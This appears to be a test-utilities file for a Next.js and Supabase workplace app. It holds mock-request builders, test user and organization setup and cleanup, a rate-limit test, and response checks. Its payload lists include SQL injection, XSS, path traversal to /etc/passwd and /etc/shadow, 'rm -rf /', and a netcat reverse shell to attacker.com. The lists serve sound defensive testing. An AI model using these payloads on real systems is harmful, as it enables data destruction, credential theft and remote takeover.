/**
 * Test Utilities for Security Testing
 */

import { NextRequest } from 'next/server'
import { createClient } from '@supabase/supabase-js'

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!
)

export interface MockRequestOptions {
  method: string
  url?: string
  userId?: string
  organizationId?: string
  headers?: Record<string, string>
  cookies?: Record<string, string>
  body?: any
}

export function createMockRequest(options: MockRequestOptions): NextRequest
export function createMockRequest(
  method: string,
  url: string,
  body?: any,
  options?: { userId?: string; organizationId?: string; headers?: Record<string, string> }
): NextRequest
export function createMockRequest(
  methodOrOptions: string | MockRequestOptions,
  url?: string,
  body?: any,
  legacyOptions?: { userId?: string; organizationId?: string; headers?: Record<string, string> }
): NextRequest {
  // Handle object-based signature (new style)
  if (typeof methodOrOptions === 'object') {
    const options = methodOrOptions
    const headers = new Headers({
      'Content-Type': 'application/json',
      ...options.headers
    })

    if (options.organizationId) {
      headers.set('x-organization-id', options.organizationId)
    }

    // Set cookie header if cookies provided
    if (options.cookies) {
      const cookieString = Object.entries(options.cookies)
        .map(([key, value]) => `${key}=${value}`)
        .join('; ')
      headers.set('Cookie', cookieString)
    }

    const requestInit: RequestInit = {
      method: options.method,
      headers
    }

    if (options.body && options.method !== 'GET') {
      requestInit.body = JSON.stringify(options.body)
    }

    const fullUrl = options.url?.startsWith('http')
      ? options.url
      : `http://localhost${options.url || '/'}`
    const request = new NextRequest(fullUrl, requestInit)

    // Mock authentication by setting user context
    if (options.userId) {
      Object.defineProperty(request, 'auth', {
        value: { userId: options.userId },
        writable: false
      })
    }

    return request
  }

  // Handle legacy signature (old style)
  const method = methodOrOptions
  const options = legacyOptions || {}
  const headers = new Headers({
    'Content-Type': 'application/json',
    ...options.headers
  })

  if (options.organizationId) {
    headers.set('x-organization-id', options.organizationId)
  }

  const requestInit: RequestInit = {
    method,
    headers
  }

  if (body && method !== 'GET') {
    requestInit.body = JSON.stringify(body)
  }

  const fullUrl = url!.startsWith('http') ? url! : `http://localhost${url!}`
  const request = new NextRequest(fullUrl, requestInit)

  // Mock authentication by setting user context
  if (options.userId) {
    Object.defineProperty(request, 'auth', {
      value: { userId: options.userId },
      writable: false
    })
  }

  return request
}

export async function createTestUser(
  email: string,
  organizationId?: string,
  role: 'admin' | 'manager' | 'employee' = 'employee'
): Promise<string> {
  // Generate a UUID for the test user
  const { data: uuidData } = await supabase.rpc('gen_random_uuid')
  const userId = uuidData || crypto.randomUUID()

  // Create user profile
  const { data: profile, error: profileError } = await supabase
    .from('profiles')
    .insert({
      id: userId,
      email,
      full_name: `Test User ${email.split('@')[0]}`,
      auth_provider: 'email',
      organization_id: organizationId || null,
      role: organizationId ? role : null
    })
    .select()
    .single()

  if (profileError) {
    throw new Error(`Failed to create test user: ${profileError.message}`)
  }

  // If organization is provided, create user-organization relationship
  if (organizationId) {
    const { error: userOrgError } = await supabase
      .from('user_organizations')
      .insert({
        user_id: profile.id,
        organization_id: organizationId,
        role,
        is_active: true,
        is_default: true,
        joined_via: 'created',
        employment_type: 'full_time'
      })

    if (userOrgError) {
      // Clean up profile if user-org creation fails
      await supabase.from('profiles').delete().eq('id', profile.id)
      throw new Error(`Failed to create user-organization relationship: ${userOrgError.message}`)
    }
  }

  return profile.id
}

export async function createTestOrganization(name: string): Promise<string> {
  const { data: organization, error } = await supabase
    .from('organizations')
    .insert({
      name,
      slug: name.toLowerCase().replace(/\s+/g, '-'),
      google_domain: null
    })
    .select()
    .single()

  if (error) {
    throw new Error(`Failed to create test organization: ${error.message}`)
  }

  return organization.id
}

export async function cleanupTestData(
  userIds: string[] = [],
  organizationIds: string[] = []
): Promise<void> {
  try {
    // Clean up user-organization relationships first
    if (userIds.length > 0) {
      await supabase
        .from('user_organizations')
        .delete()
        .in('user_id', userIds)
    }

    // Clean up invitations
    if (organizationIds.length > 0) {
      await supabase
        .from('invitations')
        .delete()
        .in('organization_id', organizationIds)
    }

    // Clean up leave requests
    if (userIds.length > 0) {
      await supabase
        .from('leave_requests')
        .delete()
        .in('user_id', userIds)
    }

    // Clean up profiles
    if (userIds.length > 0) {
      await supabase
        .from('profiles')
        .delete()
        .in('id', userIds)
    }

    // Clean up organization settings
    if (organizationIds.length > 0) {
      await supabase
        .from('organization_settings')
        .delete()
        .in('organization_id', organizationIds)
    }

    // Clean up organizations
    if (organizationIds.length > 0) {
      await supabase
        .from('organizations')
        .delete()
        .in('id', organizationIds)
    }
  } catch (error) {
    console.error('Error during test cleanup:', error)
  }
}

export async function createTestInvitation(
  organizationId: string,
  email: string,
  role: 'admin' | 'manager' | 'employee' = 'employee'
): Promise<string> {
  const token = `test-token-${Date.now()}-${Math.random().toString(36).slice(2)}`
  
  const { data: invitation, error } = await supabase
    .from('invitations')
    .insert({
      organization_id: organizationId,
      email,
      role,
      token,
      expires_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours from now
    })
    .select()
    .single()

  if (error) {
    throw new Error(`Failed to create test invitation: ${error.message}`)
  }

  return token
}

export function generateSecurityTestPayloads() {
  return {
    sqlInjection: [
      "'; DROP TABLE users; --",
      "admin'; UPDATE users SET role='admin' WHERE email='test@example.com'; --",
      "test@example.com' UNION SELECT * FROM users WHERE '1'='1",
      "test'; INSERT INTO admin_users (email) VALUES ('hacker@evil.com'); --",
      "1' OR '1'='1",
      "1'; EXEC xp_cmdshell('dir'); --"
    ],
    xss: [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src="x" onerror="alert(1)">',
      '"><script>document.cookie="stolen"</script>',
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)"></iframe>'
    ],
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/shadow',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd'
    ],
    commandInjection: [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& whoami',
      '`whoami`',
      '$(whoami)',
      '; nc -e /bin/sh attacker.com 4444'
    ],
    invalidTokens: [
      '',
      'invalid-token',
      'abc123',
      '../../../admin',
      'SELECT * FROM tokens',
      '<script>alert("xss")</script>',
      '../../etc/passwd',
      'Bearer malicious-token'
    ]
  }
}

export async function simulateRateLimitTest(
  endpoint: string,
  requestCount: number = 20,
  timeWindow: number = 1000
): Promise<Response[]> {
  const requests: Promise<Response>[] = []
  
  for (let i = 0; i < requestCount; i++) {
    const request = createMockRequest('POST', endpoint, {
      email: `test${i}@ratelimit.com`,
      password: 'testpassword123'
    })
    
    // Add small delay to simulate real-world timing
    await new Promise(resolve => setTimeout(resolve, timeWindow / requestCount))
    
    // This would need to be adapted based on the actual route handler
    requests.push(fetch(`http://localhost:3000${endpoint}`, {
      method: request.method,
      headers: Object.fromEntries(request.headers.entries()),
      body: request.body
    }))
  }
  
  return Promise.all(requests)
}

export function validateSecureResponse(response: Response, data: any) {
  const securityChecks = {
    hasSecurityHeaders: false,
    noInfoDisclosure: true,
    properErrorHandling: true,
    noSqlInjectionIndicators: true,
    noXssIndicators: true
  }

  // Check security headers
  const securityHeaders = [
    'x-content-type-options',
    'x-frame-options',
    'x-xss-protection'
  ]
  
  securityHeaders.forEach(header => {
    if (response.headers.get(header)) {
      securityChecks.hasSecurityHeaders = true
    }
  })

  // Check for information disclosure in error messages
  const sensitivePatterns = [
    /database|sql|internal|server|stack trace/i,
    /Error:/,
    /pg_/,
    /constraint/,
    /violates/,
    /relation.*does not exist/i
  ]

  const responseText = JSON.stringify(data)
  sensitivePatterns.forEach(pattern => {
    if (pattern.test(responseText)) {
      securityChecks.noInfoDisclosure = false
    }
  })

  // Check for SQL injection indicators
  const sqlPatterns = [
    /DROP TABLE/i,
    /UPDATE.*SET/i,
    /INSERT INTO/i,
    /DELETE FROM/i,
    /UNION SELECT/i
  ]

  sqlPatterns.forEach(pattern => {
    if (pattern.test(responseText)) {
      securityChecks.noSqlInjectionIndicators = false
    }
  })

  // Check for XSS indicators
  const xssPatterns = [
    /<script>/i,
    /javascript:/i,
    /onerror/i,
    /onload/i
  ]

  xssPatterns.forEach(pattern => {
    if (pattern.test(responseText)) {
      securityChecks.noXssIndicators = false
    }
  })

  return securityChecks
}